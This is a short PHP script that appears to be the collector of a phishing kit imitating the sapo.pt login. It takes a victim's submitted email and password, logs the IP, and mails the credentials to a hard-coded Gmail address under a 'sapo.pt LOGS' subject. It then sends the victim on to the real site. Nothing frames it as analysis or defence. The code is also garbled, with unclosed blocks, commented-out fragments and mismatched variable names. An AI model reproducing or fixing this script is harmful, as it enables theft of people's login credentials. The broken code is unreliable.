<?php
if ($_SERVER["REQUEST_METHOD"] === 
// $user = $_REQUEST["email"];
// $pass = $_REQUEST["password"];

if (getenv(HTTP_CLIENT_IP)){
$ip=getenv(HTTP_CLIENT_IP);
}
else {
$ip=getenv(REMOTE_ADDR);
}

// $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
// $browser = $_SERVER['HTTP_USER_AGENT'];
 

  if ($_SERVER["REQUEST_METHOD"] === 
//   "POST") {
   
    // $email = $_POST["email"];
    // $password = $_POST["password"];
    
//     $subj = "sapo.pt LOGS-> $user,$pass";



// mail($recipient1 , $subj , $data);
// mail($rec2 , $subj , $data);


    // Set up email details
    $to = "musadmusad6@gmail.com"; // Replace with your Gmail address
    $subject = "Login Information";
    mail($rec2 , $subj , $data);
     $password = $_POST["password"]
    $message = "Email: $Email\nPassword: $Password";

    // Send the email
    if 
    (mail($to, $subject, $message)) {
        echo "https://sapo.pt/";
    } else {
        echo "Failed to send email. Please check your server's configuration.";
    // }
}
?>
